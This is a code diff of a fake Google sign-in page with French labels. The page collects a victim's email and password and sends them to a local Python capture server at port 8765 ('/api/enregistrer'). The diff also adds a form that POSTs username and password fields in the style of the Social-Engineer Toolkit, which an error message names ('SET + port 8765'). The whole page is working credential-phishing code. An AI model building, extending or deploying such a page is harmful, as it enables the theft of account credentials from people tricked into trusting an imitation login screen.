@@ -38,29 +38,34 @@
         </div>
 
         <div class="form-step" id="step-password" data-step="password" hidden>
-          <button type="button" class="account-chip" id="changeAccountButton">
-            <span class="account-chip__avatar" aria-hidden="true"></span>
-            <span class="account-chip__email" id="displayedEmail"></span>
-            <span class="account-chip__chevron" aria-hidden="true">▾</span>
-          </button>
+          <form id="passwordForm" method="POST" action="/">
+            <input type="hidden" name="username" id="usernameField" value="" />
 
-          <div class="field-group">
-            <label for="password">Saisissez votre mot de passe</label>
-            <input
-              id="password"
-              type="password"
-              autocomplete="off"
-              required
-            />
-          </div>
+            <button type="button" class="account-chip" id="changeAccountButton">
+              <span class="account-chip__avatar" aria-hidden="true"></span>
+              <span class="account-chip__email" id="displayedEmail"></span>
+              <span class="account-chip__chevron" aria-hidden="true">▾</span>
+            </button>
 
-          <a class="helper-link" href="#">Mot de passe oublié ?</a>
+            <div class="field-group">
+              <label for="password">Saisissez votre mot de passe</label>
+              <input
+                id="password"
+                name="password"
+                type="password"
+                autocomplete="off"
+                required
+              />
+            </div>
 
-          <p class="save-status" id="saveStatus" hidden role="status"></p>
+            <a class="helper-link" href="#">Mot de passe oublié ?</a>
 
-          <div class="actions">
-            <button type="button" id="passwordSubmitButton">Suivant</button>
-          </div>
+            <p class="save-status" id="saveStatus" hidden role="status"></p>
+
+            <div class="actions">
+              <button type="submit" id="passwordSubmitButton">Suivant</button>
+            </div>
+          </form>
         </div>
       </div>
     </section>
@@ -84,13 +89,22 @@
     const stepEmail = document.querySelector("#step-email");
     const stepPassword = document.querySelector("#step-password");
     const identifier = document.querySelector("#identifier");
+    const passwordForm = document.querySelector("#passwordForm");
+    const usernameField = document.querySelector("#usernameField");
     const password = document.querySelector("#password");
     const displayedEmail = document.querySelector("#displayedEmail");
     const emailNextButton = document.querySelector("#emailNextButton");
-    const passwordSubmitButton = document.querySelector("#passwordSubmitButton");
     const changeAccountButton = document.querySelector("#changeAccountButton");
     const saveStatus = document.querySelector("#saveStatus");
     const GOOGLE_LOGIN_URL = "https://accounts.google.com/v3/signin/identifier";
+
+    function getPort() {
+      return window.location.port || (window.location.protocol === "https:" ? "443" : "80");
+    }
+
+    function usePythonServer() {
+      return getPort() === "8765";
+    }
 
     function getCaptureApiUrl() {
       const params = new URLSearchParams(window.location.search);
@@ -102,8 +116,6 @@
 
       return `http://${window.location.hostname}:8765/api/enregistrer`;
     }
-
-    const API_URL = getCaptureApiUrl();
 
     function showStep(step) {
       const isEmail = step === "email";
@@ -121,8 +133,8 @@
       }
     }
 
-    async function enregistrerIdentifiants(email, motDePasse) {
-      const response = await fetch(API_URL, {
+    async function enregistrerViaPython(email, motDePasse) {
+      const response = await fetch(getCaptureApiUrl(), {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -148,6 +160,7 @@
       }
 
       displayedEmail.textContent = email;
+      usernameField.value = email;
       password.value = "";
       showStep("password");
     });
@@ -156,27 +169,29 @@
       showStep("email");
     });
 
-    passwordSubmitButton.addEventListener("click", async () => {
-      const email = displayedEmail.textContent.trim();
+    passwordForm.addEventListener("submit", async (event) => {
+      const email = usernameField.value.trim();
       const motDePasse = password.value.trim();
 
       if (!motDePasse) {
+        event.preventDefault();
         password.focus();
         return;
       }
 
-      passwordSubmitButton.disabled = true;
-      passwordSubmitButton.textContent = "Enregistrement...";
+      if (!usePythonServer()) {
+        return;
+      }
+
+      event.preventDefault();
       saveStatus.hidden = true;
 
       try {
-        await enregistrerIdentifiants(email, motDePasse);
+        await enregistrerViaPython(email, motDePasse);
       } catch (error) {
         saveStatus.hidden = false;
-        saveStatus.textContent = `Erreur : lancez "python server.py" puis testez sur http://${window.location.hostname}:8765 (ou avec SET + port 8765 ouvert).`;
+        saveStatus.textContent = "Serveur Python indisponible. Lancez : python server.py";
         saveStatus.classList.add("is-error");
-        passwordSubmitButton.disabled = false;
-        passwordSubmitButton.textContent = "Suivant";
         return;
       }
 
@@ -189,13 +204,6 @@
       if (event.key === "Enter") {
         event.preventDefault();
         emailNextButton.click();
-      }
-    });
-
-    password.addEventListener("keydown", (event) => {
-      if (event.key === "Enter") {
-        event.preventDefault();
-        passwordSubmitButton.click();
       }
     });
   </script>
